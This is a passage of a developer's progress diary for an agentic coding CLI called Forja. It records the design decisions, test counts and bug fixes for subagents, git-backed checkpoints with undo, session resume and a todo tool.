# Backlog

Forja progress diary. Entries in reverse chronological order (newest on top).

Format:

```
## [YYYY-MM-DD] <milestone>/<step> — <title>

**Done:** ...
**Decisions:** ...
**Pending:** ...
**Next:** ...
```

---

## [2026-04-29] M3 / Step 4.1 — Subagent runtime (in-process) + `task` tool

Lands `AGENTIC_CLI §11` minus worktree isolation: a parent harness
can declare subagents via `.md` frontmatter, the `task` tool spawns
a child harness with restricted toolset and own budget, the child
runs in an isolated context (no parent message history) and writes
its own session row linked back to the parent via the new
`sessions.parent_session_id` FK.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/storage/migrations/010-subagents.ts` | NEW | Adds `parent_session_id` to `sessions` (self-referential FK, ON DELETE SET NULL). Index `(parent_session_id, started_at DESC)` for hierarchy fan-out. |
| `src/storage/repos/sessions.ts` | UPDATED | `Session.parentSessionId`, `createSession({ parentSessionId })`, new `listChildSessions()`, and `listSessions({ includeSubagents })` filter (default OFF). |
| `src/subagents/types.ts` | NEW | `SubagentDefinition`, `SubagentBudget`, `SubagentScope`. |
| `src/subagents/paths.ts` | NEW | `userAgentsDir()` + `projectAgentsDir()` mirroring `permissions/paths.ts` shape (XDG + Windows fallbacks). |
| `src/subagents/load.ts` | NEW | `.md` + YAML-frontmatter parser, kebab-case validation, project shadows user, duplicate-name-in-scope rejected, `meta` overflow for future playbook fields. |
| `src/subagents/runtime.ts` | NEW | `runSubagent({ definition, prompt, parentSessionId, ... })` — builds child registry filtered to whitelist, fresh `HarnessConfig` w/ child budget + child system prompt, no parent history; returns `{ output, sessionId, status, reason, costUsd, steps, durationMs }`. Optional recursion via forwarded `subagentRegistry`. |
| `src/harness/types.ts` | UPDATED | `parentSessionId?: string` (threaded into createSession) and `subagentRegistry?: SubagentSet` (drives ctx wiring). |
| `src/harness/loop.ts` | UPDATED | When `subagentRegistry` set, builds a `spawnSubagent` closure (binds parent session id from current ctx) and threads it into `ToolContext`; forwards same registry to child runs. |
| `src/tools/types.ts` | UPDATED | `ToolContext.spawnSubagent?` + `SpawnSubagentArgs` / `SpawnSubagentResult` discriminated union (`unknown_subagent` vs `ran`). |
| `src/tools/builtin/task.ts` | NEW | Built-in tool, schema `{ subagent, prompt }`. Validates args, gates on aborts, maps non-`done` child status → `subagent.run_failed` tool error w/ envelope echoed in details. `planSafe: false` (refuses in plan mode). |
| `src/cli/bootstrap.ts` | UPDATED | Loads subagents from user/project dirs (test seams `userAgentsDir` / `projectAgentsDir`), exposes the set in `BootstrapResult`, wires `subagentRegistry` into `HarnessConfig`. |
| `src/cli/list-sessions.ts` | UPDATED | Default listing hides children; `includeSubagents` flag fans each parent into its immediate children oldest-first. JSON shape adds `parent_session_id`; table marks children with `↳ ` indent. |
| `src/cli/args.ts` | UPDATED | `--include-subagents` flag (boolean, paired with `--list-sessions`). |
| `evals/smoke-subagent-explore.sh` | NEW | Real-model smoke: parent invokes `task(subagent: 'explore', prompt: '...')`, smoke asserts a child session row was created with `parent_session_id` set, the child never invoked `write_file` (whitelist), and the parent's assistant text references the seed files (output flowed back). |
| Tests | NEW / UPDATED | `tests/storage/sessions.test.ts` (+5 — parent_session_id round-trip, ON DELETE SET NULL, listChildSessions, listSessions hidden-by-default), `tests/subagents/load.test.ts` (15 — frontmatter parse, validation, precedence, duplicate detection), `tests/subagents/runtime.test.ts` (7 — happy path, parent history isolation, system prompt source, whitelist enforcement, budget cap, typo error, envelope shape), `tests/tools/task.test.ts` (7 — happy path, missing registry, unknown name, run_failed mapping, arg validation, oversized prompt, abort), `tests/cli/list-sessions.test.ts` (+3 — hidden default, fan-out, table indent), `tests/cli/args.test.ts` (+1 — flag parse), `tests/cli/bootstrap.test.ts` (UPDATED — registry assertion includes `task`). |

**Decisions:**

- **In-process, NOT subprocess.** Spec §11 mentions "processo separado, comunicação via SQLite". For Step 4.1 we run the child in the same Bun process: it spawns a fresh session id with `parent_session_id` set, runs the same `runAgent` loop with a filtered registry / restricted prompt / restricted budget, and writes to the same SQLite db. Subprocess isolation is genuinely useful when the child needs filesystem isolation (writing subagents) — at which point worktree isolation IS the answer (Step 4.2). Keeping 4.1 in-process avoids paying the spawn cost (~50-200ms) for the dominant read-only case AND reuses every existing harness invariant (abort-signal propagation, todo store, bg manager, telemetry) without reinventing IPC.
- **Cost rollup is query-time, not write-time.** I proposed write-time rollup ("parent's `total_cost_usd` = self + children") in the design discussion; on implementation I reverted. Write-time rollup double-counts under resume + repeat task() calls, complicates the budget contract (no cost cap exists in `RunBudget` today anyway), and forces every cost-mutation path through both rows. The honest model: each session row tracks its own spend; `listChildSessions` walks the tree at query time. When a cost cap lands in `RunBudget` later, we revisit by building a parent-time getter that sums on demand.
- **Checkpoints OFF for in-process subagents.** A child writing in the parent's tree under its own `refs/agent/checkpoints/<child-session>` chain isn't reachable from the parent's `--undo`. Disabling checkpoints for the child avoids creating refs that nobody can find. Read-only subagents (the dominant case) lose nothing. Writing subagents are the §11.2 worktree job — Step 4.2 re-enables checkpoints there because the worktree gives the child its own tree to checkpoint independently.
- **Whitelist filters at registry build time, not at execution.** `runSubagent` builds a fresh `ToolRegistry` containing only the named tools; the harness's existing `tool not registered` path rejects unknown names. Cleaner than a per-call gate and reuses the existing handling for typo'd tool names. Typos in the whitelist itself THROW at runtime (caller bug, not subagent runtime state) so the author finds them at first use.
- **`spawnSubagent` lives on `ToolContext`, not as a new harness primitive.** The closure is built once per step and threaded into ctx the same way `bgManager` and `todoStore` are. Tests inject a mock predicate via `makeCtx({ spawnSubagent })`; the harness wires the real one when `config.subagentRegistry` is present. Keeps the tool surface uniform and avoids leaking provider/db/registry references into tools that don't need them.
- **`unknown_subagent` is a discriminated result, not a throw.** The model can typo a name; that's a tool error the model recovers from (`subagent.unknown` with `available: [...]` in details). Programmer errors (registry missing entirely, typo in the playbook's tool whitelist) DO throw because they signal misconfiguration the model can't fix.
- **Project scope shadows user scope; same-scope name collision throws.** Same convention as memory + permissions. Cross-scope shadowing is a feature (override the user's default on a per-project basis); within-scope duplication is an authoring mistake (two `.md` files claim the same `name`) and should fail fast at bootstrap.
- **`task` tool is `category: 'misc'` for now.** The spec's permission engine doesn't have a `subagent` category yet; promoting the route here would force a permission shape decision before its rules are designed. `'misc'` defaults route through the existing engine without behavior change. Migration to a dedicated `subagent` policy section is queued for the permission v2 pass.
- **`task` is `planSafe: false`.** A subagent could ship `write_file` in its tools whitelist; allowing `task()` in plan mode would let a child mutate the working tree behind the harness's plan-mode gate. The simplest correct rule is "no spawning during plan" — keeps plan mode globally read-only without per-subagent introspection.

**Pending (later slices):**

- Step 4.2: worktree isolation (`isolation: worktree` frontmatter). Re-enables checkpoints for writing subagents because the child's commits land in its own branch under its own worktree. Subprocess spawn becomes worth its cost there.
- Step 4.3+: playbooks (`code-review`, `security-audit`, etc.). Frontmatter shape (`output_schema`, `references`, `sampling`, `context_recipe`) already lands in `meta` overflow — only the consumer code is missing. PLAYBOOKS.md §11 spells out the procedure.
- Slash commands `/explain` / `/review` / `/audit` — wait on M4 Ink TUI; the same `runSubagent` API consumed.
- `--list-subagents` CLI verb (introspection, surfaces shadows). Cheap to add when first user asks.
- Permission category `subagent` with allow/deny/locked rules per name. Triggered when the org-config ask materializes.
- Cost rollup helper at the CLI (`cumulativeCost(sessionId)` walks `listChildSessions` recursively). Add when budget cap arrives in `RunBudget`.

**Why it matters:**

- The differential of M3 — what makes the milestone earn its name. Subagents are the primitive every later playbook (review, audit, debug, refactor) is a constraint over.
- Unblocks the M4 TUI work that wires `/explain` etc. to subagent invocation; the runtime is ready, only the slash-to-tool wire is missing.
- Establishes the `parent_session_id` audit trail every later cost / replay / forensic tool depends on.

**Verification:** `bun test` 1121 pass / 10 skip / 0 fail (+38 new
tests across storage, subagents, tools, cli); `tsc --noEmit` clean;
`biome check` clean. `evals/smoke-subagent-explore.sh` exits 0
against `anthropic/claude-haiku-4-5`: parent invoked `task()`,
1 child session row created with `parent_session_id` linked, zero
`write_file` calls in the child's `tool_calls` (whitelist enforced),
parent's terminal text referenced the seed files (child output
flowed back through the tool envelope).

**Bug surfaced by the smoke (and fixed):** initial smoke probed for
`agent.sqlite` under `$XDG_DATA_HOME/forja/`, but `defaultDbPath()`
resolves to `sessions.db` (per `src/storage/paths.ts`). The smoke
failed before the assertions ran. Fixed in the script; nothing to
change in production code (the path was always correct, only the
smoke's verification assumption was wrong).

---

## [2026-04-29] M3 / Step 3 — fix restore on unborn HEAD with dirty tree

`git stash push` refuses on unborn HEAD with the explicit message
"You do not have the initial commit yet". `snapshot()` already
supported unborn repos via `commit-tree`, but `restore()` shipped
with an unconditional `stash push` that hard-failed before the
read-tree could run — making `--undo` unusable in a freshly
init'd repo with any uncommitted work.

The data-loss case the fix protects against: an untracked
working-tree file with the SAME NAME as something in the
checkpoint gets overwritten by `read-tree --reset -u`. Without
preservation, the user's version is gone for good. Untracked
files NOT in the checkpoint survive read-tree by themselves
(git leaves them alone), so this only matters for the name-
collision shape — but that's exactly the shape an `--undo` of an
agent edit produces.

**Fix:** detect unborn HEAD before stashing. When found, build a
preservation commit with the same temp-index/commit-tree mechanism
`snapshot()` uses, anchor it under `refs/agent/restore-saved/<ms>`,
and report the ref to the caller via the new `stashKind:
'agent-ref' | 'git-stash'` field on `RestoreResult`. The CLI
renders the right recovery hint:

  - `git-stash` → "Run `git stash pop` to recover the changes…"
  - `agent-ref` → "Run `git read-tree --reset -u <ref>` to
    recover the changes (HEAD is unborn; `git stash pop` would
    fail)."

**Index re-sync** (`read-tree HEAD` after the reset) is also
gated on `headAfter !== null`. Was already correct; comment
updated to call out the unborn case explicitly.

**Tests:** unit test reproduces the bug pre-fix (the previous
"You do not have the initial commit yet" exit). New tests cover:
unborn-HEAD dirty restore (preservation ref captures the user's
version, working tree gets the checkpoint), unborn-HEAD clean
restore (no preservation), and the CLI recovery-hint variant
(matches `git read-tree --reset -u`, NOT `Run \`git stash pop\``).

**Verification:** `bun test` 1053 pass / 10 skip / 0 fail (+3 new
tests for unborn-HEAD paths); `tsc --noEmit` clean; `biome
check` clean. Bench + smoke from the previous pass still green.

---

## [2026-04-29] M3 / Step 3 — closes acceptance criteria 6+7

`CHECKPOINTS.md §5` listed 8 acceptance criteria. The mock-driven
test suite covered 1–5 + 8; criteria 6 (real-model smoke) and 7
(perf in 10k-file repo) were the difference between "code that
passes mocks" and "subsystem we know works". This pass lands both.

**Critério 7 — performance bench.**

`evals/bench-checkpoint-snapshot.ts` synthesizes a temp git repo
with 10k small files (configurable via `--files`), seeds an
initial commit, and runs the production `snapshot()` 100 times,
mutating one file per iteration so write-tree has real work
(skip-on-noop is rejected as an invalid measurement). One
warm-up round discarded to keep page-cache + JIT off the timing
distribution.

Result on dev box (ext4, NVMe, ~10k files):
  min   111.57ms
  p50   117.13ms
  mean  117.97ms
  p95   124.04ms
  p99   137.04ms
  max   149.45ms

SLO is `p95 < 500ms` per CHECKPOINTS §2.8. We're at 124ms — 4×
headroom. The bench is shape-stable enough to drop into a CI
gate later (cost: $0, no API).

**Critério 6 — real-model smoke.**

`evals/smoke-checkpoint-undo.sh` mirrors the smoke-resume pattern:
- mktemp workspace, isolated XDG, fresh `git init`
- bypass-mode `.agent/permissions.yaml` so write_file isn't policy-denied
- 3 seed files, sha-256-captured pre-edit
- agent prompt asking Claude Haiku to prepend a header line to all
  three via write_file
- assert: at least one `checkpoint_created` event AND at least one
  file changed (proves the agent did the work)
- `--undo --yes <sessionId>`
- assert: each file's sha-256 matches the pre-edit capture, byte-
  for-byte

Cost: ~$0.005-0.02 per run on Haiku 4.5.

**Bug surfaced by the smoke (and fixed):**

`src/cli/index.ts` had a top-level "missing prompt" gate that
exempted `--list-sessions` but not `--undo` / `--checkpoints`.
Running `--undo <session>` without a follow-up prompt errored
out with the help text instead of dispatching the lifecycle
verb. Mock tests didn't catch this — they call `run()` directly,
bypassing the entry. The smoke spawns the real binary path and
caught it on the first run.

Fix: extend the prompt-optional list to cover the two new
verbs. Tests in `tests/cli/index.test.ts` now exercise both
end-to-end through the spawned subprocess so the regression
can't sneak back via the `run()` shortcut.

**Why the smoke was load-bearing:**

The bug above is exactly the class of failure that mocks miss —
not a logic error in the checkpoint subsystem itself, but a
glue-layer mismatch between the CLI entry and the verb
dispatcher. Without the smoke, this would have shipped to a real
user as "agent --undo X gives me the help text". Worth the
~$0.01 tax to catch upfront.

**Step 3 status:** all 8 acceptance criteria of CHECKPOINTS §5
satisfied. Subsystem ships.

**Verification:** `bun test` 1050 pass / 10 skip / 0 fail (+2 new
tests for the prompt gate); `tsc --noEmit` clean; `biome check`
clean. `bun run evals/bench-checkpoint-snapshot.ts` exits 0
(p95=124ms). `./evals/smoke-checkpoint-undo.sh` exits 0 against
Haiku 4.5.

---

## [2026-04-29] M3 / Step 3 — review fixes (post-self-review pass)

Self-review surfaced 13 issues across the Step 3 surface — 3 critical
(C1–C3), 5 medium, and 5 minor. All addressed in this pass; the
checkpoints subsystem now has tighter subprocess hygiene, no
race-on-shutdown, and a metadata-driven escapesCwd flag.

**Critical:**

- **C1 — Race between fire-and-forget retention purge and `db.close`.**
  `cli/run.ts` closes the DB right after `runAgent` returns; the
  prior fire-and-forget purge could outlive the close and hit a
  closed sqlite handle (segfault risk depending on Bun's binding).
  Fix: capture the purge promise in the loop's outer scope and
  `await` it in the outer `finally` (with `.catch` swallow) before
  any other cleanup. The retention tests dropped their 50ms
  `setTimeout` polling — the purge now resolves synchronously by
  the time `runAgent` returns.
- **C2 — Spec §13 vs CHECKPOINTS.md divergence.** Spec §13 still
  declared the v0 columns (`ref`, `kind`, `files_changed`,
  `size_bytes`); the design doc CHECKPOINTS.md §2.4 already
  resolved the open question to (`git_ref`, `had_bash`) and the
  code followed §2.4. CLAUDE.md says diverging from spec requires
  a spec PR first — fixed by editing §13 to match (cascade FK,
  `had_bash` CHECK, comment pointing to §2.4 for the v0→v1
  motivation).
- **C3 — `restore()` could leave a stash orphan on a GC'd commit.**
  Old shape: stash dirty changes first, then `read-tree --reset
  -u <sha>` — if the sha was GC'd, the read-tree threw and the
  user got "Restored to checkpoint X" while their working tree
  was actually in stash@{0}. Fix: probe `rev-parse --verify
  <sha>^{commit}` BEFORE stashing. Test verifies dirty file
  stays in working tree when the sha is unreachable.

**Medium:**

- **M1 — Post-restore index now matches HEAD, not the checkpoint.**
  `read-tree --reset -u <ckpt>` rewrote both index and worktree
  to the checkpoint tree, leaving HEAD pointing past it. The
  user's `git status` then showed the diff between HEAD and the
  ckpt as "staged for commit" — confusing UX when they had their
  own commits during the agent run. Fix: after the reset, run
  `read-tree HEAD` (no -u) to re-sync the index. Status reads as
  the natural "unstaged changes vs HEAD" (or clean, when HEAD ==
  ckpt-tree). Test asserts `git status --porcelain` shows only
  untracked-file rows post-restore.
- **M2 — Orphan-ref sweep was O(N×M).** Per-ref
  `listCheckpointsBySession` lookup turned the cleanup into a
  quadratic walk for sessions with no rows but many refs.
  Replaced with one `SELECT DISTINCT session_id FROM checkpoints`
  and a Set lookup. Same correctness, linear.
- **M3 — `runGit` had no timeout and leaked subprocess on stdin
  failure.** Added a 30s default timeout (`RUN_GIT_DEFAULT_TIMEOUT_MS`,
  per-call override via `opts.timeoutMs`); a stuck git process
  (waiting on a ref lock from another git instance) now throws
  `git X timed out after Nms` instead of wedging the harness for
  the full wall-clock budget. Stdin write/end is wrapped in
  try/finally that kills the subprocess on error, closing the
  zombie-on-broken-pipe gap.
- **M4 — Manager opened its own `Bun.spawn` for `update-ref`.**
  Inconsistent with the rest of the surface (everything else
  goes through `runGit`). Exposed `setSessionRef(cwd, sessionId,
  sha)` in `git.ts` and the manager's purge re-pointing now
  uses it — same env scrubbing, same timeout, same auditable
  surface.
- **M5+m2 — Dead code + `path.dirname`.** `purge()`'s sessionId
  branch read `rows = listCheckpointsBySession` and discarded
  with `void rows;` (leftover from an earlier shape that wanted
  per-ref deletion); removed. `cleanupTempIndex` switched
  `join(indexFile, '..')` → `dirname(indexFile)` for clarity
  and platform-safety.

**Minor:**

- **m1 — `ToolMetadata.escapesCwd` flag with metadata-first
  detection.** `had_bash` was hardcoded to a name list (`bash`,
  `bash_background`, `bash_kill`); future tools with the same
  risk profile would silently miss the warning. Added optional
  `escapesCwd?: boolean` to ToolMetadata; the bash family opts
  in. The harness checks the flag first and falls back to the
  name list as defense in depth so external tool definitions
  that pre-date the flag still get the warning.
- **m3 — Friendly CLI message for GC'd ckpt commits.** `--undo`
  on a checkpoint whose commit was reclaimed by `git gc` used to
  surface raw git output (`fatal: bad object` /
  `Needed a single revision`). Rewrites detected via substring
  match into "this checkpoint references commit X which is no
  longer reachable; run `agent --checkpoints purge <session>` to
  drop the stale rows." Test seeds an unreachable sha and
  asserts the hint is on stderr.

**Verification:** `bun test` 1048 pass / 10 skip / 0 fail (+3 vs the
foundation pass: GC-collected restore hint, post-restore index
shape, restore-on-bad-sha leaves dirty intact); `tsc --noEmit`
clean; `biome check` clean. Retention tests dropped their
`setTimeout(50)` polling — the C1 await makes purge resolution
deterministic.

---

## [2026-04-29] M3 / Step 3 — Checkpoints + `--undo`

Lands `AGENTIC_CLI §12` + the `CHECKPOINTS.md` design doc:
every step that runs a tool with `metadata.writes === true`
produces a git-backed snapshot that `--undo` (or
`--checkpoints restore`) can revert to. Reversibility-by-design
(principle 10) finally has its load-bearing implementation.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/storage/migrations/009-checkpoints.ts` | NEW | `checkpoints` table — id, session_id (FK CASCADE), step_id, git_ref, created_at, had_bash. Two indexes covering (session_id, created_at DESC) and (session_id, step_id) |
| `src/storage/repos/checkpoints.ts` | NEW | insert/get/listBySession/getLatest/delete/deleteBySession/listOlderThan. CASCADE-tested round-trip |
| `src/checkpoints/git.ts` | NEW | Low-level git plumbing — runGit wrapper (LC_ALL=C, GIT_TERMINAL_PROMPT=0), isGitRepo, getHeadSha, resolveRef, snapshot (temp index + commit-tree), restore (stash-on-dirty + read-tree --reset -u), diff (tree-vs-tree to cover untracked), listSessionRefs, deleteSessionRef |
| `src/checkpoints/detect.ts` | NEW | Soft probe: `available: boolean + reason` so the harness can wire a no-op manager when cwd isn't a git repo |
| `src/checkpoints/manager.ts` | NEW | `CheckpointManager` impl from CHECKPOINTS §3 — snapshot/list/get/restore/diff/purge. Purge handles per-session and per-age (default 30d) with orphan-ref sweep |
| `src/harness/loop.ts` | UPDATED | Optional manager creation behind `enableCheckpoints` flag. Snapshot fired before the per-step tool loop when any tool_use's metadata declares `writes:true`. `had_bash` derived by tool name (bash, bash_background, bash_kill). Lazy retention purge fired fire-and-forget at session start. New events: `checkpoint_created`, `checkpoints_unavailable` |
| `src/harness/types.ts` | UPDATED | `enableCheckpoints?: boolean` (default false), `checkpointsRetentionDays?: number`, two new HarnessEvent variants |
| `src/cli/args.ts` | UPDATED | New flags: `--undo <session>`, `--checkpoints <verb> [positionals…]` (verbs: list/diff/restore/purge), `--yes` / `-y` for the bash-side-effect confirm |
| `src/cli/checkpoints.ts` | NEW | Standalone handler (no bootstrap, DB-only). All 5 verbs (list/diff/restore/purge + undo as latest-restore alias). Bash-warning gate refuses without `--yes`. Stash-on-dirty messaging on restore. JSON + table formats |
| `src/cli/run.ts` | UPDATED | Dispatches `--undo` / `--checkpoints` short-circuit before bootstrap (mirroring `--list-sessions`). Mutually exclusive with `--resume` by ordering |
| `src/cli/bootstrap.ts` | UPDATED | Real CLI runs default `enableCheckpoints: input.plan !== true`. Plan mode opts out (no writes can land ⇒ nothing to undo) |
| Tests | NEW | `tests/storage/checkpoints.test.ts` (10), `tests/checkpoints/git.test.ts` (21), `tests/checkpoints/detect.test.ts` (2), `tests/checkpoints/manager.test.ts` (14), `tests/harness/checkpoints.test.ts` (10 — wiring + retention sweep), `tests/cli/checkpoints.test.ts` (15 — verbs, JSON shape, bash gate, cross-session refusal), `tests/cli/args.test.ts` (+11 — new flag parsing) |

**Decisions:**

- **Ref shape: linear chain per session under `refs/agent/checkpoints/<session>`.** Each new snapshot's parent is the prior session checkpoint (or HEAD on the first), so the whole history stays reachable from one ref. We update the ref only on a successful new commit; the prior chain stays intact via parent links, and the DB row is the authoritative pointer when we need to walk back. NOT `refs/stash` — would pollute the user's stash list and is one-stack-only.
- **Snapshot via temp index + `commit-tree`, NOT `git stash create`.** stash-create can't pick parents (always HEAD). Our chain shape requires parent-on-prior-checkpoint, so we use the lower primitive: `GIT_INDEX_FILE=tmp git read-tree HEAD; git add -A; git write-tree; commit-tree <tree> -p <prior>`. The user's `.git/index` is never touched.
- **No-op skip uses tree-equality vs prior parent.** When the working tree's `write-tree` matches the prior chain head's tree, we return `sha=null` and the harness writes no row. Defense in depth: a tool that lies about `writes:true` won't pollute the audit trail.
- **`had_bash` derived by tool name, not metadata.** The bash family (`bash`, `bash_background`, `bash_kill`) is the only group whose side effects escape cwd reversibility (DB writes, network, processes). Hardcoding by name keeps the rule auditable; adding a new bash-shaped tool is an explicit edit, not an emergent metadata interaction.
- **CLI surfaces are headless-first.** `--yes` / `-y` replaces the spec's interactive `Type 'undo' to confirm` prompt. Real interactive confirm waits for the M4 Ink TUI; pre-TUI the operator runs without `-y`, sees the warning, decides, re-runs with `-y`. JSON shape preserved on every verb so eval harnesses and audit consumers can parse.
- **`session_start` precedes `checkpoints_unavailable`.** Renderers that bracket on `session_start` would otherwise miss the warning. We capture the unavailability flag before session_start and emit it right after, preserving the bracket contract.
- **Diff uses tree-vs-tree.** `git diff <ckpt-sha>` only sees tracked files; an untracked file added since the snapshot would silently disappear from the diff. We materialize the working tree as an ephemeral commit object via the same temp-index technique and diff `<ckpt-tree>` against `<wt-tree>`. Slightly slower than the naive form, correct on all input shapes.
- **Lazy retention sweep is fire-and-forget at session_start.** A monorepo with thousands of refs could spend seconds in `update-ref -d`; blocking the harness on cleanup defeats the spec's "non-blocking, best-effort" wording. Errors are swallowed so a corrupt ref store doesn't bring down a session for cleanup that can be retried next run. Safe under concurrent snapshots: the cutoff is `now - retentionDays`, well behind any in-flight session's `created_at`.
- **`--undo` resolves latest internally rather than requiring `--checkpoints restore <session> <latest>`.** Matches CHECKPOINTS §2.3 word-for-word and is the dominant case. Implemented as a thin alias over `restore` so the bash-warning + stash logic is shared.
- **Plan mode disables the subsystem.** Saves one git probe per `--plan` invocation and avoids confusion about why an undo would be empty (no writes ran). Spec §12.4 documents the relationship between plan + checkpoints; the implementation makes them orthogonal at construction time.

**Pending (M4 / later):**

- Slash commands `/undo`, `/checkpoint list/restore/diff/purge` — wait on M4 Ink TUI; same internal API consumed.
- Interactive `Type 'undo' to confirm` prompt — also TUI-bound.
- `cp --reflink` fallback for non-git directories — deferred per CHECKPOINTS §4. Pull-in signal: a user explicitly asks while in a non-git workspace.
- Time-based auto-snapshots and branching/forking from a checkpoint — out of scope per CHECKPOINTS §4.
- Performance smoke against a 10k-file repo (CHECKPOINTS §5 criterion 7). Manual verification today; bundle with the eval-baseline pass when M3 closes.

**Why it matters:**

- "Reversível por design" (root principle 10) finally has the implementation that makes it true. Before this slice, every successful write tool was permanent.
- Unblocks the M4 TUI work that needs `/undo` semantics already in the engine — the slash command is just a wire to `runCheckpointsCli`.
- Eval / regression tooling can now restore between runs to keep the working tree in a known state without manual `git reset`.

**Verification:** `bun test` 1045 pass / 10 skip / 0 fail (+114 new tests across storage, checkpoints, harness, cli); `tsc --noEmit` clean; `biome check` clean.

---

## [2026-04-29] M3 / Step 2.4 — Resume + list-sessions (CLI)

Lands the non-UI half of spec §2.1 session continuity:
`agent --list-sessions` and `agent --resume <id|last>`. The
interactive picker (bare `--resume`, `/sessions *` slash
commands, mini-recap inline) waits for the M4 Ink TUI.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/cli/args.ts` | UPDATED | New flags `--list-sessions`, `--resume <id\|last>`. `--resume` requires a value (interactive picker is M4) |
| `src/cli/list-sessions.ts` | NEW | Standalone handler — opens DB, lists newest-first, prints table or NDJSON. Skips bootstrap entirely (no API key needed) |
| `src/cli/run.ts` | UPDATED | Dispatch on flags: list-sessions short-circuit, resume id/`last` resolution before bootstrap, validation that prompt is non-empty for resume |
| `src/cli/bootstrap.ts` | UPDATED | Plumbs `resumeFromSessionId` to HarnessConfig |
| `src/storage/repos/sessions.ts` | UPDATED | New `reopenSession(db, id)` flips status='running', clears endedAt — needed because completeSession's WHERE guard requires running |
| `src/harness/types.ts` | UPDATED | `HarnessConfig.resumeFromSessionId` |
| `src/harness/resume.ts` | NEW | `messagesToProviderMessages` reconstitutes ProviderMessage[] from persisted Message rows. Skips role='tool' (forward-compat: not currently emitted) |
| `src/harness/loop.ts` | UPDATED | Init block forks: resume path uses existing id + reopenSession + listMessagesBySession, new-session path unchanged. New userPrompt is appended after history regardless |
| Tests | NEW | `tests/storage/sessions.test.ts` (+3 reopenSession), `tests/harness/resume.test.ts` (4 cases), `tests/cli/list-sessions.test.ts` (7 cases), `tests/cli/resume.test.ts` (7 e2e cases incl. resume by id, resume 'last', empty session list, missing prompt, unknown id, status round-trip done→running→done) |

**Decisions:**

- **`--resume` requires a value (id or `last`).** Bare `--resume`
  for picker waits for the TUI. Falling back to a CLI prompt
  selector would be its own UX problem (number-of-rows? formatting
  in pipes?) — defer cleanly.
- **`last` is resolved BEFORE bootstrap.** Run.ts opens a temporary
  DB just to resolve, validates the id exists, then passes the
  concrete id through. Trade: one extra DB-open per resume call
  (cheap, sqlite is memory-mapped); benefit: typo'd id fails fast
  with a clean errSink message instead of an `internalError` exit
  with no diagnostic.
- **Resume requires a non-empty prompt.** Without one, the model
  would just see its own last assistant message replayed — no new
  turn. Cleaner to error than to loop on degenerate input.
- **bg processes are NOT carried over.** The previous run
  terminated them in its outer finally; resume starts with a fresh
  bg manager. Documented as a deliberate boundary in the loop
  comment — resume restores conversation, not running children.
- **Skipping role='tool' messages on reconstitution.** The schema
  has the slot but the loop never persists it (tool results are
  wrapped in user-role messages). Defensive skip if a future
  migration changes this — the resume reconstitution would just
  drop role=tool until the helper is updated.
- **`reopenSession` is idempotent.** Calling on an already-running
  session is a no-op (UPDATE with WHERE id=?). Calling on an
  unknown id throws. Tests cover both.
- **No bootstrap dependency for `--list-sessions`.** Inspecting
  prior runs shouldn't require an API key or a parsable
  `permissions.yaml`. The handler opens DB + migrates + queries +
  closes, that's it.

**Pending (M4 / later):**

- Interactive picker (bare `--resume`) — needs Ink TUI.
- `/sessions list/show/switch` slash commands — needs TUI command
  surface.
- Mini-recap inline in the listing — Recap subsystem (M4).
- `--replay` for debug/eval — separate step.
- Worktree-aware filtering on resume (warn if cwd diverged
  between original session and resume).

**Why it matters:**

- Closes the most-asked-for non-UI feature: "I ran something
  yesterday, let me continue that thread."
- Unblocks downstream eval flows that need stable session ids
  for replay.
- Demonstrates the storage layer round-trips messages cleanly
  (the resume helper is the first non-trivial reader of the
  persisted message log).

**Verification:** `bun test` 931 pass / 10 skip / 0 fail (+27 new
tests across cli, storage, harness); `tsc --noEmit` clean;
`biome check` clean.

---

## [2026-04-29] M3 / Step 2.3 — todo_write tool

Lands the TodoList primitive from spec §7.4. The model uses
`todo_write(items)` to make sub-task progress visible during
multi-step work; the live checklist landing in the TUI is M4
(Ink), but the storage and tool surface are usable today via
audit logs.

**Slice scope:**

| Component | Status | Notes |
|---|---|---|
| `src/todo/index.ts` | NEW | In-memory `TodoStore` keyed by sessionId; per-spec NOT persisted. Defensive copies on get/set so callers can't mutate stored state |
| `src/tools/builtin/todo-write.ts` | NEW | Tool with snake_case surface (active_form), runtime validation parity, single-in_progress enforcement |
| `ToolContext.todoStore` | UPDATED | Optional `TodoStore` field, parallel to bgManager. Tool surfaces `todo.store_unavailable` if absent |
| Harness wiring | UPDATED | Loop creates store at session start, clears on session end. Same lifecycle pattern as bgManager |
| Tool registry | UPDATED | Registered in `BUILTIN_TOOLS`; sits with read-only group |
| Tests | NEW | `tests/todo/store.test.ts` (8 cases) + `tests/tools/todo-write.test.ts` (14 cases) |

**Decisions:**

- **In-memory only.** Spec §7.4 is explicit: "Não persiste entre
  sessões — é estado de trabalho, não memória." No SQLite repo,
  no audit table. The only persistence surface is the tool_call
  audit row that records each `todo_write` invocation with its
  args (the standard mechanism for every tool).
- **At-most-one in_progress enforced at write time.** Spec calls
  this out as the right shape. The tool returns
  `tool.invalid_arg` if the model passes >1 in_progress so the
  bug is corrected at write time rather than ambiguously
  rendered. Cheap to enforce here; expensive to chase at render
  time later.
- **Atomic replacement, no merge.** The model passes the full
  intended list every call. Simpler API surface, no partial-
  update edge cases. Empty array clears the list.
- **Defensive copies on both get and set.** The store is the
  single owner of mutation; callers never get a reference to the
  internal array. Same pattern protects against accidental
  reference-leak bugs that would otherwise let a tool mutate
  state without going through `set()`.
- **Snake_case at the tool boundary, camelCase internally.**
  `active_form` ↔ `activeForm`. Manual conversion at the seam
  (not via keysToSnake) because the inbound direction also
  needs translation; the helper only goes one way today.

**Why it matters:**

- Implements spec §7.4 literally — no scope creep, no daemons,
  no cross-session memory.
- Validation parity follows the playbook §3.3 pattern
  established across the rest of the tool surface this branch.
- Eval scoring (spec §16) can now reward `todo_write` use on
  tasks of 5+ steps as planned in `eval.scoring.todo_used`.

**Pending:**

- Live checklist render in the TUI — M4 (Ink). The store +
  audit log already let a renderer display the current list at
  any point.
- Eval cases that reward TodoList usage on multi-step tasks —
  follow-up to the regression eval batch.

**Verification:** `bun test` 895 pass / 10 skip / 0 fail (+22 new
tests across todo store + tool); `tsc --noEmit` clean;
`biome check` clean.

---

## [2026-04-29] hardening: bash tool abort handling + SIGKILL escalation

Surface-level claim corrected by evidence. Initial analysis said
"`ctx.signal` doesn't thread to bash subprocess during exec" — a
quick standalone test (`bun run` calling `Bun.spawn` with
`signal: ctrl.signal`) showed Bun honors signal natively and kills
